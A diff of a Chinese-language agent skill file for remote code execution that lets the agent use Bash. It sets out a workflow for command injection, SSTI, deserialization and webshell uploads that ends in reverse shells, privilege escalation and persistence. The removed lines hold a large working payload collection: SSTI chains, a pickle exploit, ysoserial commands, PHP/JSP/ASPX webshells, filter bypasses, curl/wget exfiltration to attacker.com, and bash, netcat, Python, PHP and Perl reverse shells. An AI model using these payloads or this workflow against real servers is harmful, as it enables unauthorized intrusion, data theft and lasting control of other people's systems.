@@ -1,6 +1,6 @@
 ---
 name: rce
-description: 远程代码执行漏洞检测与利用。当目标存在命令执行、代码执行、反序列化、模板注入、文件上传时使用。
+description: "识别远程代码执行注入点，生成针对性 payload，验证命令执行并建立反弹 shell。覆盖命令注入、SSTI、反序列化、文件上传等攻击面。当目标存在可控输入参数、模板渲染、反序列化入口或文件上传功能时使用。"
 allowed-tools: Bash, Read, Write
 ---
 
@@ -8,319 +8,97 @@ allowed-tools: Bash, Read, Write
 
 在目标服务器上执行任意代码或命令，获取系统控制权。
 
-## 常见指示器
+参考文件：
+- [PAYLOADS.md](./PAYLOADS.md) — 各类 payload 集合（命令注入、SSTI、反序列化、Webshell、反弹 Shell、绕过技术）
+- [TOOLS.md](./TOOLS.md) — 工具使用参考（commix、tplmap、ysoserial）
 
-- 命令执行参数（cmd=, exec=, command=, run=）
-- 代码执行功能（eval, exec, system）
-- 文件上传功能
-- 反序列化输入（序列化数据、pickle、Java 对象）
-- 模板渲染（Jinja2, Twig, Freemarker）
-- 动态包含（include, require）
+## 决策流程
 
-## 检测方法
+```
+目标分析
+├─ 存在用户可控参数 → 命令注入测试（步骤 1）
+├─ 存在模板渲染 → SSTI 测试（步骤 2）
+├─ 存在序列化数据 → 反序列化测试（步骤 3）
+├─ 存在文件上传 → Webshell 上传（步骤 4）
+└─ 以上均无 → 深入侦察，寻找隐藏入口
+```
 
-### 1. 命令注入测试
+## 工作流程
+
+### 步骤 1：命令注入测试
+
+**检测**
 
 ```bash
-# 基础测试
+# 基础测试 — 注入命令分隔符
 curl "http://target.com/ping?ip=127.0.0.1;id"
 curl "http://target.com/ping?ip=127.0.0.1|id"
-curl "http://target.com/ping?ip=127.0.0.1`id`"
 curl "http://target.com/ping?ip=127.0.0.1$(id)"
 
-# 时间盲注
+# 时间盲注 — 确认无回显场景
 curl "http://target.com/ping?ip=127.0.0.1;sleep 5"
-curl "http://target.com/ping?ip=127.0.0.1|sleep 5"
 ```
 
-### 2. 模板注入测试
+**验证检查点**：确认响应中包含命令输出（如 `uid=`）或观察到明确的时间延迟，再进入利用阶段。
+
+**利用**
+
+- 有回显：直接执行系统命令收集信息
+- 无回显：使用 DNS/HTTP 外带或时间盲注（参见 [PAYLOADS.md](./PAYLOADS.md) 无回显 RCE 部分）
+- 遇到过滤：使用空格绕过、关键字绕过等技术（参见 [PAYLOADS.md](./PAYLOADS.md) 绕过技术部分）
+- 自动化检测：使用 commix（参见 [TOOLS.md](./TOOLS.md)）
+
+### 步骤 2：模板注入 (SSTI) 测试
+
+**检测**
 
 ```bash
-# 基础测试
-curl "http://target.com/page?name={{7*7}}"
-curl "http://target.com/page?name=${7*7}"
-curl "http://target.com/page?name=<%= 7*7 %>"
+# 数学表达式探测
+curl "http://target.com/page?name={{7*7}}"    # Jinja2/Twig
+curl "http://target.com/page?name=${7*7}"     # Freemarker
+curl "http://target.com/page?name=<%= 7*7 %>" # ERB
 ```
 
-## 攻击向量
-
-### 命令注入
-
-```bash
-# 命令分隔符
-; id
-| id
-|| id
-& id
-&& id
-`id`
-$(id)
-%0aid
-\nid
-
-# 常用命令
-id
-whoami
-uname -a
-cat /etc/passwd
-ls -la
-pwd
-env
-
-# 反弹 Shell
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
-nc -e /bin/bash attacker.com 4444
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-```
-
-### 代码注入
-
-```php
-// PHP
-system($_GET['cmd']);
-exec($_GET['cmd']);
-passthru($_GET['cmd']);
-shell_exec($_GET['cmd']);
-eval($_GET['code']);
-assert($_GET['code']);
-preg_replace('/.*/e', $_GET['code'], '');
-```
-
-```python
-# Python
-eval(user_input)
-exec(user_input)
-os.system(user_input)
-subprocess.call(user_input, shell=True)
-__import__('os').system(user_input)
-```
-
-### 模板注入 (SSTI)
-
-```python
-# Jinja2 (Python)
-{{7*7}}
-{{config}}
-{{config.items()}}
-{{''.__class__.__mro__[1].__subclasses__()}}
-{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
-
-# 常用 payload
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{joiner.__init__.__globals__.os.popen('id').read()}}
-```
-
-```java
-// Freemarker (Java)
-${7*7}
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-${"freemarker.template.utility.Execute"?new()("id")}
-```
-
-```php
-// Twig (PHP)
-{{7*7}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|filter('system')}}
-```
-
-### 反序列化
-
-```python
-# Python pickle
-import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('id',))
-
-payload = pickle.dumps(RCE())
-```
-
-```java
-// Java (ysoserial)
-java -jar ysoserial.jar CommonsCollections1 'id' | base64
-java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
-```
+**验证检查点**：确认响应中出现 `49` 而非原始模板字符串，再继续深入利用。
 
-```php
-// PHP
-O:8:"stdClass":1:{s:4:"test";s:2:"id";}
-// 利用 __wakeup, __destruct 等魔术方法
-```
+**利用**
 
-### 文件上传 RCE
+- 确认模板引擎类型后，使用对应 payload 链（参见 [PAYLOADS.md](./PAYLOADS.md) SSTI 部分）
+- 自动化检测：使用 tplmap（参见 [TOOLS.md](./TOOLS.md)）
 
-```php
-// PHP webshell
-<?php system($_GET['cmd']); ?>
-<?php eval($_POST['code']); ?>
-<?=`$_GET[0]`?>
-<?php passthru($_REQUEST['cmd']); ?>
+### 步骤 3：反序列化测试
 
-// 图片马
-GIF89a<?php system($_GET['cmd']); ?>
+**检测**
 
-// .htaccess
-AddType application/x-httpd-php .jpg
-```
+- 识别序列化数据格式（Base64 编码的 Java 对象、Python pickle、PHP 序列化字符串）
+- 检查 Content-Type 头（如 `application/x-java-serialized-object`）
 
-```jsp
-// JSP webshell
-<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
-```
+**验证检查点**：确认目标接受并处理序列化数据（如修改数据后观察不同的错误响应），再发送 RCE payload。
 
-```aspx
-// ASPX webshell
-<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>
-```
+**利用**
 
-## 绕过技术
+- 根据目标语言选择对应的反序列化利用链（参见 [PAYLOADS.md](./PAYLOADS.md) 反序列化部分）
+- Java 目标使用 ysoserial（参见 [TOOLS.md](./TOOLS.md)）
 
-### 空格绕过
+### 步骤 4：文件上传 Webshell
 
-```bash
-# 使用 $IFS
-cat$IFS/etc/passwd
-cat${IFS}/etc/passwd
+**检测**
 
-# 使用 Tab
-cat	/etc/passwd
+- 测试上传功能的文件类型限制
+- 尝试绕过：双扩展名（shell.php.jpg）、空字节（shell.php%00.jpg）、Content-Type 伪造
 
-# 使用大括号
-{cat,/etc/passwd}
+**验证检查点**：确认文件已成功上传且可通过 Web 访问（HTTP 200），再执行 Webshell 命令。
 
-# 使用 < >
-cat</etc/passwd
-```
+**利用**
 
-### 关键字绕过
+- 上传对应语言的 Webshell（参见 [PAYLOADS.md](./PAYLOADS.md) 文件上传部分）
+- 通过 Webshell 执行命令
 
-```bash
-# 拼接
-c'a't /etc/passwd
-c"a"t /etc/passwd
-c\at /etc/passwd
+### 步骤 5：建立持久访问
 
-# 变量
-a=c;b=at;$a$b /etc/passwd
+**前置检查**：已通过步骤 1-4 中任一方式确认可执行命令。
 
-# Base64
-echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+- 反弹 Shell 获取交互式访问（参见 [PAYLOADS.md](./PAYLOADS.md) 反弹 Shell 部分）
+- 提权并持久化
 
-# 十六进制
-$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
-
-# 通配符
-/???/??t /???/p??s??
-cat /e?c/p?sswd
-cat /e*c/p*d
-```
-
-### 无回显 RCE
-
-```bash
-# DNS 外带
-curl http://`whoami`.attacker.com
-ping -c 1 `whoami`.attacker.com
-
-# HTTP 外带
-curl http://attacker.com/?data=`cat /etc/passwd | base64`
-wget http://attacker.com/?data=$(id)
-
-# 时间盲注
-if [ $(whoami | cut -c 1) = "r" ]; then sleep 5; fi
-
-# 写文件
-id > /var/www/html/output.txt
-```
-
-## 常用工具
-
-### commix
-
-```bash
-# 自动检测
-commix -u "http://target.com/page?cmd=test"
-
-# POST 请求
-commix -u "http://target.com/page" --data="cmd=test"
-
-# 获取 shell
-commix -u "http://target.com/page?cmd=test" --os-shell
-```
-
-### tplmap
-
-```bash
-# 模板注入检测
-python tplmap.py -u "http://target.com/page?name=test"
-
-# 获取 shell
-python tplmap.py -u "http://target.com/page?name=test" --os-shell
-
-# 指定引擎
-python tplmap.py -u "http://target.com/page?name=test" -e jinja2
-```
-
-### ysoserial
-
-```bash
-# 生成 payload
-java -jar ysoserial.jar CommonsCollections1 'id'
-java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
-
-# 常用 gadget
-CommonsCollections1-7
-Jdk7u21
-Spring1-2
-Hibernate1-2
-```
-
-## 反弹 Shell
-
-### Bash
-
-```bash
-bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-```
-
-### Netcat
-
-```bash
-nc -e /bin/bash 10.0.0.1 4444
-nc -c /bin/bash 10.0.0.1 4444
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
-```
-
-### Python
-
-```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-```
-
-### PHP
-
-```php
-php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-### Perl
-
-```perl
-perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-## 最佳实践
-
-1. 先测试命令注入：使用 ; | ` $() 等分隔符
-2. 检查是否有回显，无回显使用时间盲注或外带
-3. 测试模板注入：{{7*7}} ${7*7}
-4. 检查文件上传功能，尝试上传 webshell
-5. 分析反序列化点，使用 ysoserial 生成 payload
-6. 使用绕过技术规避过滤
-7. 成功 RCE 后尝试反弹 shell
-8. 提权并持久化
+**验证检查点**：确认反弹 Shell 连接成功（收到交互式 prompt），再进行后续操作。
